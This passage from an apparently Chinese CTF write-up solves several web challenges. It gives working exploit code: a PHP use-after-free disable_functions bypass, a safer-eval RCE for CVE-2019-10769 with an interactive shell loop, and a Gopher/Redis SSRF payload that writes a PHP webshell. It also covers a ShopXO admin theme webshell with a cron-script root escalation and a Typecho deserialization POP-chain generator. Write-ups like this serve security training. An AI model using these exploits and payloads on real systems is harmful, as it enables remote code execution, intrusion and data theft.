class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?Ginkgo&#x3D;include(&#39;&#x2F;tmp&#x2F;bypass.php&#39;);</span><br><span class="line">&#x3D;base64&#x3D;&gt;</span><br><span class="line">&#x2F;?Ginkgo&#x3D;aW5jbHVkZSgnL3RtcC9ieXBhc3MucGhwJyk7</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">"http://9d44f150-34ce-4331-aa79-ea6af78e66ac.node3.buuoj.cn//"</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">l = len(r.text)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = input(<span class="string">"php&gt;"</span>)</span><br><span class="line">    r = requests.get(url + <span class="string">'?Ginkgo='</span> + base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    print(r.text[l:])</span><br><span class="line"><span class="comment"># 输入 include('/tmp/bypass.php');</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://i.loli.net/2020/05/26/Fp6wTr9zjvmhtXo.png" alt="image-20200525081814503"></p>
<h3 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h3><p>考点：ShopXO弱口令、后台Getshell、提权</p>
<p>查看ShopXO的<span class="exturl" data-url="aHR0cHM6Ly9hc2suc2hvcHhvLm5ldC9hcnRpY2xlLzU=">安装教程<i class="fa fa-external-link-alt"></i></span>获得账号密码和后台地址</p>
<p><img src="https://i.loli.net/2020/05/26/jhfemJQpk3uOzvF.png" alt="image-20200525082637209"></p>
<p>搜一下发现有全版本getshell<span class="exturl" data-url="aHR0cDovL3d3dy5uY3RyeS5jb20vMTY2MC5odG1s">渗透测试|shopxo后台全版本获取shell复现<i class="fa fa-external-link-alt"></i></span></p>
<p>下载一个免费主题，将我们的php马挂上去安装</p>
<p><img src="https://i.loli.net/2020/05/26/I6WLP2pEJZQncFN.png" alt="image-20200525084226216"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;87e20c83-a941-4cc9-975a-d1c643d6dcd3.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;crzz.php</span><br></pre></td></tr></table></figure>

<p>用蚁剑连上</p>
<p>根目录看到flag和flag.hint</p>
<p><code>/flag</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;this_is_fake_flag&#x2F;true_flag_in_&#x2F;root&#125;</span><br></pre></td></tr></table></figure>

<p><code>/flag.hint</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mon May 25 00:46:30 2020</span><br><span class="line">Get The RooT,The Date Is Useful!</span><br></pre></td></tr></table></figure>

<p>根目录我们没有权限访问</p>
<p>接着看到根目录有个<code>auto.sh</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> (python /var/mail/makeflaghint.py &amp;) &amp;&amp; sleep 60; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>使用命令<code>ps aux</code>查看进程</p>
<p><img src="https://i.loli.net/2020/05/26/79afUOMQtA3yZ6r.png" alt="image-20200525085150268"></p>
<p>发现<code>/auto.sh</code>使用的是root权限</p>
<p>这时候就有个想法，通过修改<code>/var/mail/makeflaghint.py</code>来进行提权</p>
<p>修改如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">gk1=str(time.ctime())</span><br><span class="line">gk=<span class="string">"\nGet The RooT,The Date Is Useful!"</span></span><br><span class="line">f=io.open(<span class="string">"/flag.hint"</span>,<span class="string">"rb+"</span>)</span><br><span class="line">f.write(str(gk1))</span><br><span class="line">f.write(str(gk))</span><br><span class="line">f.write(os.popen(<span class="string">'cat /root/*'</span>).read())</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>一分钟过后查看<code>/flag.hint</code>即可getflag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mon May 25 00:53:30 2020</span><br><span class="line">Get The RooT,The Date Is Useful!flag&#123;614f39ce-b54d-4eef-9cad-1ad7b48857b7&#125;</span><br></pre></td></tr></table></figure>

<h3 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h3><p>Hint : cve-2020-7066</p>
<p><img src="https://i.loli.net/2020/05/26/xhu4miRFVjy6qIg.png" alt="image-20200525085559305"></p>
<p>找到漏洞的说明</p>
<p><img src="https://i.loli.net/2020/05/26/7iEU6QtqGblxsFX.png" alt="image-20200525085730976"></p>
<blockquote>
<p> get_headers()函数会被<code>null</code>截断</p>
</blockquote>
<p>点击<code>View CTFHub</code>之后<code>/?url=http://www.ctfhub.com</code></p>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1%00www.ctfhub.com</span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; HTTP&#x2F;1.1 200 OK</span><br><span class="line">    [1] &#x3D;&gt; Date: Mon, 25 May 2020 01:00:45 GMT</span><br><span class="line">    [2] &#x3D;&gt; Server: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">    [3] &#x3D;&gt; X-Powered-By: PHP&#x2F;7.3.15</span><br><span class="line">    [4] &#x3D;&gt; Tips: Host must be end with &#39;123&#39;</span><br><span class="line">    [5] &#x3D;&gt; Vary: Accept-Encoding</span><br><span class="line">    [6] &#x3D;&gt; Content-Length: 113</span><br><span class="line">    [7] &#x3D;&gt; Connection: close</span><br><span class="line">    [8] &#x3D;&gt; Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>看到Tips，将payload修改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.123%www.ctfhub.com</span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; HTTP&#x2F;1.1 200 OK</span><br><span class="line">    [1] &#x3D;&gt; Date: Mon, 25 May 2020 01:01:54 GMT</span><br><span class="line">    [2] &#x3D;&gt; Server: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">    [3] &#x3D;&gt; X-Powered-By: PHP&#x2F;7.3.15</span><br><span class="line">    [4] &#x3D;&gt; FLAG: flag&#123;b1747881-8d3b-4abe-89a9-1ed6d15d2326&#125;</span><br><span class="line">    [5] &#x3D;&gt; Vary: Accept-Encoding</span><br><span class="line">    [6] &#x3D;&gt; Content-Length: 113</span><br><span class="line">    [7] &#x3D;&gt; Connection: close</span><br><span class="line">    [8] &#x3D;&gt; Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h3 id="EZ三剑客-EzNode"><a href="#EZ三剑客-EzNode" class="headerlink" title="EZ三剑客-EzNode"></a>EZ三剑客-EzNode</h3><p><code>源码</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">'safer-eval'</span>); <span class="comment">// 2019.7/WORKER1 找到一个很棒的库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">'/eval'</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'timeout'</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">'Timeout!'</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/eval'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">'Wrong Wrong Wrong!!!!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/javascript;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span></span><br><span class="line">app.get(<span class="string">'/version'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/json;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./package.json'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/html;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.html'</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Start listening'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><code>版本</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"src"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"index.js"</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"MIT"</span>,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"body-parser"</span>: <span class="string">"1.19.0"</span>,</span><br><span class="line">    <span class="attr">"express"</span>: <span class="string">"4.17.1"</span>,</span><br><span class="line">    <span class="attr">"safer-eval"</span>: <span class="string">"1.3.6"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可能利用的点只有/eval的safeEval了</p>
<p>nodejs不太懂，看wp复现</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cDovL25vZGVqcy5jbi9hcGkvdGltZXJzLmh0bWwjdGltZXJzX3NldHRpbWVvdXRfY2FsbGJhY2tfZGVsYXlfYXJncw==">Nodejs⽂档<i class="fa fa-external-link-alt"></i></span></p>
<p>setTimeout 当 delay ⼤于 2147483647 或⼩于 1 时，则 delay 将会被设置为 1。⾮整数的 delay 会被截断为整数。</p>
</blockquote>
<p>safe-eval RCE漏洞<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Fkdmlzb3JpZXMvR0hTQS12NjN4LXhjOWotaGh2cQ==">(CVE-2019-10769)<i class="fa fa-external-link-alt"></i></span><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvbW1lbnRob2wvc2FmZXItZXZhbC9pc3N1ZXMvMTA=">(issue)<i class="fa fa-external-link-alt"></i></span></p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://200418b2-5b15-46db-a848-47d1411d992b.node3.buuoj.cn/eval?delay=2147483648'</span> <span class="comment"># 绕过delay</span></span><br><span class="line">payload = <span class="string">"""(function ()&#123;</span></span><br><span class="line"><span class="string">  const process = clearImmediate.constructor("return process;")();</span></span><br><span class="line"><span class="string">  return process.mainModule.require("child_process").execSync("%s").toString()</span></span><br><span class="line"><span class="string">&#125;)()"""</span> <span class="comment"># safe_eval RCE</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = input(<span class="string">'shell&gt;'</span>)</span><br><span class="line">    print(requests.post(url,data=&#123;<span class="string">'e'</span>:payload % cmd&#125;).text)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/26/nvOTjcIbGPeQAHY.png" alt="image-20200525121150664"></p>
<h3 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h3><p><img src="https://i.loli.net/2020/05/26/J7tUim4eMF9ol2z.png" alt="image-20200525121430719"></p>
<p>访问得到</p>
<p><img src="https://i.loli.net/2020/05/26/JhVtaKU2Bku5Xvb.png" alt="image-20200525121538562"></p>
<p>编个脚本扫一扫</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://b481639b-8ece-4787-ab71-93c871f08846.node3.buuoj.cn/index.php?url=&#123;&#125;&amp;submit=提交'</span></span><br><span class="line">base = requests.get(url.format(<span class="string">''</span>)).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    r=requests.get(url.format(<span class="string">'173.138.236.'</span>+str(i))).text</span><br><span class="line">    <span class="keyword">if</span> r!=base:</span><br><span class="line">        print(<span class="string">'173.138.236.'</span>+str(i))</span><br></pre></td></tr></table></figure>

<p>扫出这么多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">173.138.236.4 # 只显示一个1</span><br><span class="line">173.138.236.5 # Roundcube Webmail Login</span><br><span class="line">173.138.236.6 # A painless self-hosted Git service</span><br><span class="line">173.138.236.7 # Inspect HTTP Requests</span><br><span class="line">173.138.236.11 # 被你发现了,但你也许需要试试其他服♂务,就在这台机子上! ...我说的是端口啦1</span><br></pre></td></tr></table></figure>

<p>有提示，那就针对173.138.236.11入手</p>
<p>编个常见端口的扫描器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://b481639b-8ece-4787-ab71-93c871f08846.node3.buuoj.cn/index.php?url=&#123;&#125;&amp;submit=提交'</span></span><br><span class="line">base = requests.get(url.format(<span class="string">''</span>)).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">53</span>,<span class="number">80</span>,<span class="number">443</span>,<span class="number">3306</span>,<span class="number">5432</span>,<span class="number">6379</span>,<span class="number">8080</span>,<span class="number">8888</span>,<span class="number">9200</span>,<span class="number">27017</span>,<span class="number">22122</span>]:</span><br><span class="line">    r=requests.get(url.format(<span class="string">'173.138.236.11:'</span>+str(i))).text</span><br><span class="line">    <span class="keyword">if</span> r!=base:</span><br><span class="line">        print(<span class="string">'173.138.236.11:'</span>+str(i))</span><br></pre></td></tr></table></figure>

<p>扫出了两个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">173.138.236.11:80 # HTTP 超文本传输服务</span><br><span class="line">173.138.236.11:6379 # Redis数据库端口</span><br></pre></td></tr></table></figure>

<p>ssrf+redis，我们利用gopher写shell</p>
<p>使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RhcnVua2FudC9Hb3BoZXJ1cw==">Gopherus<i class="fa fa-external-link-alt"></i></span>生成一个</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gopherus --exploit redis</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/26/OtABPXJ1GuH8fYe.png" alt="image-20200525124848658"></p>
<p>做下简单的修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;173.138.236.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%27cat%20&#x2F;flag%27%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure>

<p>接着提交<code>http://173.138.236.11/shell.php</code>获得flag</p>
<p><img src="https://i.loli.net/2020/05/26/wNVGgWM4fp1K5z2.png" alt="image-20200525125358000"></p>
<h3 id="EZ三剑客-EzTypecho"><a href="#EZ三剑客-EzTypecho" class="headerlink" title="EZ三剑客-EzTypecho"></a>EZ三剑客-EzTypecho</h3><p>代码审计，先用VCG扫一扫</p>
<p>扫出一堆东西。。。</p>
<p>决定先去<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3R5cGVjaG8vdHlwZWNobw==">github<i class="fa fa-external-link-alt"></i></span>康康</p>
<p>看到这篇文章<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8xNTIwNTguaHRtbA==">https://www.freebuf.com/vuls/152058.html<i class="fa fa-external-link-alt"></i></span></p>
<p>然后看下载下来的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php if (isset($_GET[&#39;finish&#39;])) : ?&gt;</span><br><span class="line">	&lt;?php if (@file_exists(__TYPECHO_ROOT_DIR__ . &#39;&#x2F;config.inc.php&#39;)) : ?&gt;</span><br><span class="line">	...</span><br><span class="line">	&lt;?php elseif (!Typecho_Cookie::get(&#39;__typecho_config&#39;)): ?&gt;</span><br><span class="line">	...</span><br><span class="line">	&lt;?php else : ?&gt;</span><br><span class="line">		...</span><br><span class="line">		&lt;?php</span><br><span class="line">            if(!isset($_SESSION)) &#123; die(&#39;no, you can\&#39;t unserialize it without session QAQ&#39;);&#125;</span><br><span class="line">            $config &#x3D; unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));</span><br><span class="line">            Typecho_Cookie::delete(&#39;__typecho_config&#39;);</span><br><span class="line">            $db &#x3D; new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</span><br><span class="line">            $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">            Typecho_Db::set($db);</span><br><span class="line">    	?&gt;</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p>首先<code>$_GET[&#39;finish&#39;]</code>不为空，其次要有<code>$_SESSION</code></p>
<blockquote>
<p><img src="https://i.loli.net/2020/05/26/j3VWIhFZaNR62OP.png" alt="image-20200525195331526"></p>
<p>得知在⽂件上传时POST⼀个与PHP_SESSION_UPLOAD_PROGRESS同名变量时会在<br>session中添加数据，从⽽绕过session检测</p>
</blockquote>
<p><code>exp.php:</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = base64_decode($argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS1 = <span class="string">'RSS 1.0'</span>;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">    <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line">    <span class="keyword">const</span> DATE_RFC822 = <span class="string">'r'</span>;</span><br><span class="line">    <span class="keyword">const</span> DATE_W3CDTF = <span class="string">'c'</span>;</span><br><span class="line">    <span class="keyword">const</span> EOL = <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::RSS2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'title'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'link'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'date'</span> =&gt; <span class="number">1508895132</span>,</span><br><span class="line">            <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = $cmd;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'system'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">    <span class="string">'prefix'</span> =&gt; <span class="string">'typecho_'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br></pre></td></tr></table></figure>

<p>payload:</p>
